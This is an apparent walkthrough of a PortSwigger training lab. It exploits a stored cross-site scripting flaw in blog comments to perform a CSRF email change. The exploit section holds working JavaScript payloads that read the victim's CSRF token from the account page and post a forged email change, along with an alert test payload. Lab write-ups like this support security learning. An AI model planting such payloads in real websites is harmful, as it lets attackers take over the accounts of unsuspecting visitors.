# [Lab: Exploiting XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)

## Lab

This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: `wiener:peter`

## Analysis

csrf:

- login to wiener account and intercept a change password request:

    ```http
    POST /my-account/change-email HTTP/1.1

    email=test%40test.test&csrf=FOGV5uzR24scygCsUjTp2f1EMZjlVte7
    ```

  - csrf: a token to prevent csrf

- check csrf token at post comment section: `<input required="" type="hidden" name="csrf" value="FOGV5uzR24scygCsUjTp2f1EMZjlVte7">`

- => same value

xss:

- this challenge has no defense againts xxs, just post a comment `<script>alert(1)</script>` and boom

## Exploit

to csrf change password, let's craft a script:

  ```js
  <script>
  fetch('https://id.web-security-academy.net/my-account/change-email',{
  method:'POST',
  mode: 'no-cors',
  body: 'email=hacked@gamil.com&csrf=' + document.getElementsByName('csrf')[0].getAttribute('value')
  });
  </script>
  ```

- failed: `Uncaught TypeError: Cannot read properties of undefined (reading 'getAttribute')`
- because the element contains csrf token is loaded after the script

second try:

  ```js
  <script>
  var req = new XMLHttpRequest();
  req.onload = handleResponse;
  req.open('get','/my-account',true);
  req.send();
  function handleResponse() {
      var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
      var changeReq = new XMLHttpRequest();
      changeReq.open('post', '/my-account/change-email', true);
      changeReq.send('csrf='+token+'&email=test@test.com')
  };
  </script>
  ```

solved
